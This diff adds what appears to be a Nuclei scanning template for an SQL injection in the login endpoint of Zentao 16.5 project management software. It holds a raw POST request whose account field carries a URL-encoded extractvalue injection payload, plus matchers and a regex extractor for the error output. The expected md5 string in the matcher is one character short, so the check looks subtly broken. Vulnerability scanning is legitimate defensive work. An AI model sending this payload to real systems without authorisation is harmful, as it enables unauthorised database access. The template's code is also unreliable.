@@ -1,0 +1,38 @@
+id: zentao-sql-injection
+info:
+  name: Zentao user-login.html SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Zentao project management software version 16.5 is vulnerable to an SQL Injection vulnerability in the `user-login.html` endpoint. Attackers can exploit this vulnerability to access sensitive database information or perform unauthorized actions.
+  classification:
+    cve-id: []
+    cwe-id: CWE-89
+  tags: sql-injection, zentao
+  metadata:
+    release_date: "2022-04-27"
+
+http:
+  - raw:
+      - |
+        POST /user-login.html HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/user-login.html
+
+        account=admin%27+and+%28select+extractvalue%281%2Cconcat%280x7e%2C%28select+md5%281%29%29%2C0x7e%29%29%29%23
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849"
+          - "XPATH syntax error"
+        part: body
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        regex:
+          - "XPATH syntax error: '(.*?)'"
+        group: 1
